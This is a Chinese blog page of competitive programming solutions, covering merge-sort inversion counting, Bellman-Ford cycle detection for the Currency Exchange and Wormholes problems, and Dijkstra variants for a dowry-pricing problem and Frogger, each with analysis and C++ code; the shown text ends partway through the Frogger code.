<h3 id="2-Ultra-QuickSort"><a href="#2-Ultra-QuickSort" class="headerlink" title="2.Ultra-QuickSort"></a>2.<strong>Ultra-QuickSort</strong></h3><p><strong>Description</strong></p>
<p>In this problem, you have to analyze a particular sorting algorithm. The algorithm processes a sequence of n distinct integers by swapping two adjacent sequence elements until the sequence is sorted in ascending order. For the input sequence<br>9 1 0 5 4 ,<br>Ultra-QuickSort produces the output<br>0 1 4 5 9 .<br>Your task is to determine how many swap operations Ultra-QuickSort needs to perform in order to sort a given input sequence.</p>
<p><strong>Input</strong></p>
<p>The input contains several test cases. Every test case begins with a line that contains a single integer n &lt; 500,000 — the length of the input sequence. Each of the the following n lines contains a single integer 0 ≤ a[i] ≤ 999,999,999, the i-th input sequence element. Input is terminated by a sequence of length n = 0. This sequence must not be processed.</p>
<p><strong>Output</strong></p>
<p>For every input sequence, your program prints a single line containing an integer number op, the minimum number of swap operations necessary to sort the given input sequence.</p>
<h5 id="问题分析："><a href="#问题分析：" class="headerlink" title="问题分析："></a>问题分析：</h5><p>​        这个问题是让我们输出模拟冒泡排序中交换的次数，这里交换的次数就是数组中逆序对的个数。这里对逆序数进行解释：逆序数就是在只允许相邻两个元素交换的条件下的，得到有序序列的交换次数。</p>
<p>​    对于逆序对的求法，我们可以使用归并算法来进行求解：这里就是将数组递归的分成两部分，先算局部的逆序数，然后再算大范围的逆序数。例如 3 9 || 1 5，下一步进行归并，由于都是递增序列，因此前面一个元素算逆序数后面元素等于都算一遍，因此可以用mid-i+1来进行表示。 </p>
<p>​    具体的算法细节我们在代码中给出，在代码中一定要注意条件的一致性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 500005</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line">ll q[N],t[N],sum;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">merge_sort</span><span class="params">(ll l,ll r)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&gt;=r) <span class="keyword">return</span>;</span><br><span class="line">    ll mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">    merge_sort(l,mid);</span><br><span class="line">    merge_sort(mid+<span class="number">1</span>,r);</span><br><span class="line">    <span class="comment">//左右两部分目前是递增的有序数组</span></span><br><span class="line">    ll k=<span class="number">0</span>,i=l,j=mid+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=r)&#123;</span><br><span class="line">        <span class="keyword">if</span>(q[i]&lt;=q[j]) t[k++]=q[i++];</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            t[k++] = q[j++];</span><br><span class="line">            sum += mid-i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j&lt;=r)  &#123;</span><br><span class="line">        t[k++]=q[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= mid)&#123;</span><br><span class="line">        t[k++] = q[i++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(ll i=l,j=<span class="number">0</span>;i&lt;=r;i++,j++)</span><br><span class="line">        q[i]=t[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    ll n;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;n)!=EOF&amp;&amp;n)&#123;</span><br><span class="line">        <span class="keyword">for</span>(ll i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;q[i]);</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    merge_sort(<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,sum);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="3-Currency-Exchange"><a href="#3-Currency-Exchange" class="headerlink" title="3.Currency Exchange"></a>3.<strong>Currency Exchange</strong></h3><p><strong>Description</strong></p>
<p>Several currency exchange points are working in our city. Let us suppose that each point specializes in two particular currencies and performs exchange operations only with these currencies. There can be several points specializing in the same pair of currencies. Each point has its own exchange rates, exchange rate of A to B is the quantity of B you get for 1A. Also each exchange point has some commission, the sum you have to pay for your exchange operation. Commission is always collected in source currency.<br>For example, if you want to exchange 100 US Dollars into Russian Rubles at the exchange point, where the exchange rate is 29.75, and the commission is 0.39 you will get (100 - 0.39) * 29.75 = 2963.3975RUR.<br>You surely know that there are N different currencies you can deal with in our city. Let us assign unique integer number from 1 to N to each currency. Then each exchange point can be described with 6 numbers: integer A and B - numbers of currencies it exchanges, and real RAB, CAB, RBA and CBA - exchange rates and commissions when exchanging A to B and B to A respectively.<br>Nick has some money in currency S and wonders if he can somehow, after some exchange operations, increase his capital. Of course, he wants to have his money in currency S in the end. Help him to answer this difficult question. Nick must always have non-negative sum of money while making his operations.</p>
<p><strong>Input</strong></p>
<p>The first line of the input contains four numbers: N - the number of currencies, M - the number of exchange points, S - the number of currency Nick has and V - the quantity of currency units he has. The following M lines contain 6 numbers each - the description of the corresponding exchange point - in specified above order. Numbers are separated by one or more spaces. 1&lt;=S&lt;=N&lt;=100, 1&lt;=M&lt;=100, V is real number, 0&lt;=V&lt;=103.<br>For each point exchange rates and commissions are real, given with at most two digits after the decimal point, 10-2&lt;=rate&lt;=102, 0&lt;=commission&lt;=102.<br>Let us call some sequence of the exchange operations simple if no exchange point is used more than once in this sequence. You may assume that ratio of the numeric values of the sums at the end and at the beginning of any simple sequence of the exchange operations will be less than 104.</p>
<p><strong>Output</strong></p>
<p>If Nick can increase his wealth, output YES, in other case output NO to the output file.</p>
<h5 id="大致题意："><a href="#大致题意：" class="headerlink" title="大致题意："></a>大致题意：</h5><p>​    Nick有一些货币，现在他想要通过一些操作让货币进行升值，现在知道一些输入，N为货币的种数，M为兑换点的数目，S为Nike手上钱的种类，V为Nick手上钱的数目，然后给出了每个兑换点a和币两种货币的数目和汇率还有佣金，找到能满足Nick需要的算法。</p>
<h5 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h5><p>​    对于这个问题，我们需要使用动态规划的思想进行解决。我们这里 可以用货币种类作为点，将货币之间的交换作为边 。货币的交换时可以多次进行重复的，因此我们需要找出一条正权回路，使S币的金额使增加的。因为图中一定会含有权值为负的边，因此Dijksra算法并不适用，Bellman-Ford算法可以适合于这样的图，只需要修改一下松弛条件即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> n; <span class="comment">//货币种类</span></span><br><span class="line"><span class="type">int</span> m; <span class="comment">//兑换点数量</span></span><br><span class="line"><span class="type">int</span> s; <span class="comment">//持有货币的种类</span></span><br><span class="line"><span class="type">double</span> value;  <span class="comment">//s货币的数量</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> all;<span class="comment">//总边数</span></span><br><span class="line"><span class="type">double</span> dis[<span class="number">101</span>]; <span class="comment">//s到各点的权，最多是101种币</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面对交换点进行定义,交换包含两种方向，我们认为是不同点</span></span><br><span class="line"><span class="comment">//货币a交换到货币b</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">point</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">        <span class="type">int</span> a;</span><br><span class="line">        <span class="type">int</span> b;</span><br><span class="line">        <span class="type">double</span> r;</span><br><span class="line">        <span class="type">double</span> c;</span><br><span class="line">&#125;P[<span class="number">202</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的bellman算法是找到最大的带权正环</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">bellman</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(dis,<span class="number">0</span>,<span class="keyword">sizeof</span>(dis));</span><br><span class="line">    <span class="comment">//将源点到各点的距离进行设置</span></span><br><span class="line">    dis[s] = value;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*relax*/</span></span><br><span class="line">    <span class="type">bool</span> flag;</span><br><span class="line">    <span class="comment">//n是所有点的个数</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;all;j++)&#123;</span><br><span class="line">            <span class="comment">//如果s换到b小于s先换到a然后再换到b，就先交换a</span></span><br><span class="line">            <span class="keyword">if</span>(dis[P[j].b] &lt; (dis[P[j].a]-P[j].c)*P[j].r)  </span><br><span class="line">            &#123;</span><br><span class="line">                dis[P[j].b] = (dis[P[j].a]-P[j].c)*P[j].r;</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">            &#125;        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!flag)</span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*search cycle*/</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;all;k++)</span><br><span class="line">        <span class="keyword">if</span>(dis[P[k].b] &lt; (dis[P[k].a] - P[k].c) * P[k].r)           <span class="comment">//正环能够无限松弛</span></span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> a,b;</span><br><span class="line">	<span class="type">double</span> rab,cab,rba,cba;   <span class="comment">//临时变量</span></span><br><span class="line"> </span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;s&gt;&gt;value)</span><br><span class="line">	&#123;</span><br><span class="line">		all=<span class="number">0</span>;    <span class="comment">//注意初始化</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;rab&gt;&gt;cab&gt;&gt;rba&gt;&gt;cba;</span><br><span class="line">			P[all].a=a;</span><br><span class="line">			P[all].b=b;</span><br><span class="line">			P[all].r=rab;</span><br><span class="line">			P[all++].c=cab;</span><br><span class="line">			P[all].a=b;</span><br><span class="line">			P[all].b=a;</span><br><span class="line">			P[all].r=rba;</span><br><span class="line">			P[all++].c=cba;</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">	    <span class="comment">/*Bellman-form Algorithm*/</span></span><br><span class="line"> </span><br><span class="line">	    <span class="keyword">if</span>(bellman())</span><br><span class="line">	    	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	    <span class="keyword">else</span></span><br><span class="line">	    	<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="4-Wormholes"><a href="#4-Wormholes" class="headerlink" title="4.Wormholes"></a>4.<strong>Wormholes</strong></h3><p><strong>Description</strong></p>
<p>While exploring his many farms, Farmer John has discovered a number of amazing wormholes. A wormhole is very peculiar because it is a one-way path that delivers you to its destination at a time that is BEFORE you entered the wormhole! (wormhole能够将你送回到t秒之前的位置)Each of FJ’s farms comprises <em>N</em> (1 ≤ <em>N</em> ≤ 500) fields conveniently numbered 1..<em>N</em>, <em>M</em> (1 ≤ <em>M</em> ≤ 2500) paths, and <em>W</em> (1 ≤ <em>W</em> ≤ 200) wormholes.</p>
<p>As FJ is an avid time-traveling fan, he wants to do the following: start at some field, travel through some paths and wormholes, and return to the starting field a time before his initial departure. Perhaps he will be able to meet himself :) .</p>
<p>To help FJ find out whether this is possible or not, he will supply you with complete maps to <em>F</em> (1 ≤ <em>F</em> ≤ 5) of his farms. No paths will take longer than 10,000 seconds to travel and no wormhole can bring FJ back in time by more than 10,000 seconds.</p>
<p><strong>Input</strong></p>
<p>Line 1: A single integer, <em>F</em>. <em>F</em> farm descriptions follow.</p>
<p>//一个整数F表示会有F个农场说明</p>
<p>Line 1 of each farm: Three space-separated integers respectively: <em>N</em>, <em>M</em>, and <em>W</em></p>
<p>//每个农场第一行时N，M和W</p>
<p>Lines 2..<em>M</em>+1 of each farm: Three space-separated numbers (<em>S</em>, <em>E</em>, <em>T</em>) that describe, respectively: a bidirectional path between <em>S</em> and <em>E</em> that requires <em>T</em> seconds to traverse. Two fields might be connected by more than one path.</p>
<p>//路径的数据，包含两个端点和时间，这是一个双向路径</p>
<p>Lines <em>M</em>+2..<em>M</em>+<em>W</em>+1 of each farm: Three space-separated numbers (<em>S</em>, <em>E</em>, <em>T</em>) that describe, respectively: A one way path from <em>S</em> to <em>E</em> that also moves the traveler back <em>T</em> seconds.</p>
<p>//虫洞的数据</p>
<p><strong>Output</strong></p>
<p>Lines 1..<em>F</em>: For each farm, output “YES” if FJ can achieve his goal, otherwise output “NO” (do not include the quotes).</p>
<h5 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h5><p>​    这个人想要使用路径和虫洞遇到之前的自己，那么就是来找到负环，如果这个图存在负环，那么他一定可以遇到之前的自己。判断负环我们可以使用Bellman-Ford算法，这里要将path看成两条路径，一条是正向路径，一条是负向的负权路径。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn=<span class="number">505</span>,INF=<span class="number">0xffffffff</span>;</span><br><span class="line"><span class="type">int</span> d[maxn];</span><br><span class="line"><span class="type">int</span> n,m;</span><br><span class="line"><span class="type">int</span> cnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> u,v,cost;</span><br><span class="line">&#125;es[maxn*maxn];</span><br><span class="line"><span class="type">bool</span> <span class="title function_">find_negative_loop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(d,<span class="number">0</span>,<span class="keyword">sizeof</span>(d));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;cnt;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            edge e=es[j];</span><br><span class="line">            <span class="keyword">if</span>(d[e.v]&gt;d[e.u]+e.cost)</span><br><span class="line">            &#123;    </span><br><span class="line">                d[e.v]=d[e.u]+e.cost;</span><br><span class="line">                <span class="keyword">if</span>(i==n<span class="number">-1</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> q;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m&gt;&gt;q;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> a,b,c;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b&gt;&gt;c;<span class="comment">//反向的边也要存储</span></span><br><span class="line">            es[cnt].u=es[cnt+<span class="number">1</span>].v=a;</span><br><span class="line">            es[cnt].v=es[cnt+<span class="number">1</span>].u=b;</span><br><span class="line">            es[cnt].cost=es[cnt+<span class="number">1</span>].cost=c;</span><br><span class="line">            cnt+=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;q;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;es[cnt].u&gt;&gt;es[cnt].v&gt;&gt;es[cnt].cost;<span class="comment">//添加负权边</span></span><br><span class="line">            es[cnt++].cost*=<span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(find_negative_loop())</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;YES&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="5-昂贵的聘礼"><a href="#5-昂贵的聘礼" class="headerlink" title="5.昂贵的聘礼"></a>5.昂贵的聘礼</h3><p><strong>Description</strong></p>
<p>年轻的探险家来到了一个印第安部落里。在那里他和酋长的女儿相爱了，于是便向酋长去求亲。酋长要他用10000个金币作为聘礼才答应把女儿嫁给他。探险家拿不出这么多金币，便请求酋长降低要求。酋长说：”嗯，如果你能够替我弄到大祭司的皮袄，我可以只要8000金币。如果你能够弄来他的水晶球，那么只要5000金币就行了。”探险家就跑到大祭司那里，向他要求皮袄或水晶球，大祭司要他用金币来换，或者替他弄来其他的东西，他可以降低价格。探险家于是又跑到其他地方，其他人也提出了类似的要求，或者直接用金币换，或者找到其他东西就可以降低价格。不过探险家没必要用多样东西去换一样东西，因为不会得到更低的价格。探险家现在很需要你的帮忙，让他用最少的金币娶到自己的心上人。另外他要告诉你的是，在这个部落里，等级观念十分森严。地位差距超过一定限制的两个人之间不会进行任何形式的直接接触，包括交易。他是一个外来人，所以可以不受这些限制。但是如果他和某个地位较低的人进行了交易，地位较高的的人不会再和他交易，他们认为这样等于是间接接触，反过来也一样。因此你需要在考虑所有的情况以后给他提供一个最好的方案。<br>为了方便起见，我们把所有的物品从1开始进行编号，酋长的允诺也看作一个物品，并且编号总是1。每个物品都有对应的价格P，主人的地位等级L，以及一系列的替代品Ti和该替代品所对应的”优惠”Vi。如果两人地位等级差距超过了M，就不能”间接交易”。你必须根据这些数据来计算出探险家最少需要多少金币才能娶到酋长的女儿。</p>
<p><strong>Input</strong></p>
<p>输入第一行是两个整数M，N（1 &lt;= N &lt;= 100），依次表示地位等级差距限制和物品的总数。接下来按照编号从小到大依次给出了N个物品的描述。每个物品的描述开头是三个非负整数P、L、X（X &lt; N），依次表示该物品的价格、主人的地位等级和替代品总数。接下来X行每行包括两个整数T和V，分别表示替代品的编号和”优惠价格”。</p>
<p><strong>Output</strong></p>
<p>输出最少需要的金币数。</p>
<h5 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h5><p>​    这个可以看做是单源点最短路径问题，因此可以通过dijikstra算法进行求解，N个物品我们可以看作N个点，从其它点到它的优惠关系看作是边。这里面要注意对于level的判断，每次将目前的点设为等级最低的点，如果有比它还低的点，或者差超过M，则视为不合法。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstring&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX(a,b) (a&gt;b ? a:b)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN(a,b) (a&lt;b ? a:b)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem(a) memset(a,0,sizeof a)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXN 105</span></span><br><span class="line"><span class="comment">//the biggest N is 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INF 0x10000<span class="comment">//这里注意设置成0xffffffff是错误的，因为这是一个很大的负数</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> Price[MAXN],Edge[MAXN][MAXN],Level[MAXN];</span><br><span class="line"><span class="type">int</span> vis[MAXN],dist[MAXN];</span><br><span class="line"><span class="type">int</span> N,M,ans;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">    mem(Price);mem(Level);</span><br><span class="line">    <span class="comment">//set the value 0 to the point</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=N;j++)&#123;</span><br><span class="line">            Edge[i][j] = INF;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> i,j,X,T,TP;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;Price[i],&amp;Level[i],&amp;X);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;X;j++)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d,%d&quot;</span>,&amp;T,&amp;TP);</span><br><span class="line">            Edge[T][i] = TP;</span><br><span class="line">        &#125;</span><br><span class="line">        Edge[<span class="number">0</span>][i] = Price[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dijkstra</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++) dist[i] = Price[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">        <span class="type">int</span> temp = INF,x;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!vis[j]&amp;&amp;dist[j]&lt;=temp)</span><br><span class="line">            temp = dist[x=j];</span><br><span class="line">        &#125;</span><br><span class="line">        vis[x] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)<span class="keyword">if</span>(dist[x]+Edge[x][j]&lt;dist[j]&amp;&amp;!vis[j])</span><br><span class="line">        dist[j]=dist[x]+Edge[x][j];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dist[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;M,&amp;N))</span><br><span class="line">    &#123;</span><br><span class="line">        init();</span><br><span class="line">        read();</span><br><span class="line">        ans = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=N;i++)&#123;</span><br><span class="line">            <span class="type">int</span> minLevel = Level[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=N;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(Level[j]-minLevel&gt;M||minLevel&gt;Level[j]) vis[j]=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span> vis[j] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> now = dijkstra();</span><br><span class="line">            ans = MIN(ans,now);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="6-Frogger"><a href="#6-Frogger" class="headerlink" title="6.Frogger"></a>6.Frogger</h3><p><strong>Description</strong></p>
<p>Freddy Frog is sitting on a stone in the middle of a lake. Suddenly he notices Fiona Frog who is sitting on another stone. He plans to visit her, but since the water is dirty and full of tourists’ sunscreen, he wants to avoid swimming and instead reach her by jumping.<br>Unfortunately Fiona’s stone is out of his jump range. Therefore Freddy considers to use other stones as intermediate stops and reach her by a sequence of several small jumps.<br>To execute a given sequence of jumps, a frog’s jump range obviously must be at least as long as the longest jump occuring in the sequence.<br>The frog distance (humans also call it minimax distance) between two stones therefore is defined as the minimum necessary jump range over all possible paths between the two stones.</p>
<p>You are given the coordinates of Freddy’s stone, Fiona’s stone and all other stones in the lake. Your job is to compute the frog distance between Freddy’s and Fiona’s stone.</p>
<p><strong>Input</strong></p>
<p>The input will contain one or more test cases. The first line of each test case will contain the number of stones n (2&lt;=n&lt;=200). The next n lines each contain two integers xi,yi (0 &lt;= xi,yi &lt;= 1000) representing the coordinates of stone #i. Stone #1 is Freddy’s stone, stone #2 is Fiona’s stone, the other n-2 stones are unoccupied. There’s a blank line following each test case. Input is terminated by a value of zero (0) for n.</p>
<p><strong>Output</strong></p>
<p>For each test case, print a line saying “Scenario #x” and a line saying “Frog Distance = y” where x is replaced by the test case number (they are numbered from 1) and y is replaced by the appropriate real number, printed to three decimals. Put a blank line after each test case, even after the last one.</p>
<p>​    这里给了一些石头和跳跃范围，因此我们可以使用dijikstra算法来进行最短路径的判断。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mem(a,b) memset(a,b,sizeof(a))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> maxnum 300</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inf 0x3f3f3f3f</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">int</span> x[maxnum],y[maxnum],n;</span><br><span class="line"><span class="type">double</span> <span class="built_in">map</span>[maxnum][maxnum];</span><br><span class="line"><span class="type">double</span> dis[maxnum];</span><br><span class="line"><span class="type">int</span> vis[maxnum];</span><br><span class="line"><span class="type">void</span> <span class="title function_">dj</span><span class="params">(<span class="type">int</span> s)</span></span><br><span class="line">&#123;</span><br><span class="line">    mem(vis,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">        dis[i]=inf;</span><br><span class="line">    dis[s]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> minn=inf,k;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;=n; j++)</span><br><span class="line">            <span class="keyword">if</span>(vis[j]==<span class="number">0</span>&amp;&amp;dis[j]&lt;minn)</span><br><span class="line">            &#123;</span><br><span class="line">                k=j;</span><br><span class="line">                